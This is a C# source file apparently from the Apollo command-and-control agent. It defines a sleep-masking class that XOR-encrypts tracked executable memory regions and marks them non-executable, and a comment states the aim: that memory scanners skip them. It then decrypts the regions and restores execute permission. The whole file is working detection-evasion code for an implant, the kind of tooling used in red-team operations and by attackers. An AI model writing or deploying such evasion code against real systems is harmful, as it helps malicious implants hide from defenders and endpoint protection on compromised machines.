using System;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;

namespace ApolloInterop.Classes.Core
{
    public class SleepMaskingManager : ISleepMaskingManager
    {
        private struct TrackedRegion
        {
            public IntPtr ProcessHandle;
            public IntPtr BaseAddress;
            public int Size;
            public byte[] XorKey;
        }

        private delegate bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        private delegate bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesRead);

        private delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);

        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        private readonly ConcurrentDictionary<IntPtr, TrackedRegion> _regions = new ConcurrentDictionary<IntPtr, TrackedRegion>();
        private readonly VirtualProtectEx _pVirtualProtectEx;
        private readonly ReadProcessMemory _pReadProcessMemory;
        private readonly WriteProcessMemory _pWriteProcessMemory;
        private readonly object _lock = new object();
        private bool _isMasked = false;

        public SleepMaskingManager(IAgent agent)
        {
            _pVirtualProtectEx = agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
            _pReadProcessMemory = agent.GetApi().GetLibraryFunction<ReadProcessMemory>(Library.KERNEL32, "ReadProcessMemory");
            _pWriteProcessMemory = agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
        }

        public void RegisterRegion(IntPtr hProcess, IntPtr baseAddress, int size)
        {
            byte[] key = Guid.NewGuid().ToByteArray();
            var region = new TrackedRegion
            {
                ProcessHandle = hProcess,
                BaseAddress = baseAddress,
                Size = size,
                XorKey = key
            };
            _regions[baseAddress] = region;
        }

        public void UnregisterRegion(IntPtr baseAddress)
        {
            _regions.TryRemove(baseAddress, out _);
        }

        public void MaskAllRegions()
        {
            lock (_lock)
            {
                if (_isMasked) return;

                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    try
                    {
                        // 1. Change to RW so we can read/write the memory
                        uint oldProtect;
                        if (!_pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_READWRITE, out oldProtect))
                            continue;

                        // 2. Read the current contents
                        byte[] buffer = new byte[region.Size];
                        uint bytesRead;
                        if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                        {
                            // Restore original protection on failure
                            _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, oldProtect, out _);
                            continue;
                        }

                        // 3. XOR encrypt in place
                        XorInPlace(buffer, region.XorKey);

                        // 4. Write the encrypted contents back
                        uint bytesWritten;
                        _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                        // 5. Leave as RW (non-executable) - scanners skip non-executable regions
                    }
                    catch
                    {
                        // Silently continue on failure for individual regions
                    }
                }

                _isMasked = true;
            }
        }

        public void UnmaskAllRegions()
        {
            lock (_lock)
            {
                if (!_isMasked) return;

                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    try
                    {
                        // 1. Read the encrypted contents (already RW from masking)
                        byte[] buffer = new byte[region.Size];
                        uint bytesRead;
                        if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                            continue;

                        // 2. XOR decrypt
                        XorInPlace(buffer, region.XorKey);

                        // 3. Write decrypted contents back
                        uint bytesWritten;
                        _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                        // 4. Restore to RX (executable, non-writable)
                        uint oldProtect;
                        _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_EXECUTE_READ, out oldProtect);
                    }
                    catch
                    {
                        // Silently continue on failure for individual regions
                    }
                }

                _isMasked = false;
            }
        }

        private static void XorInPlace(byte[] data, byte[] key)
        {
            int keyLen = key.Length;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key[i % keyLen];
            }
        }
    }
}
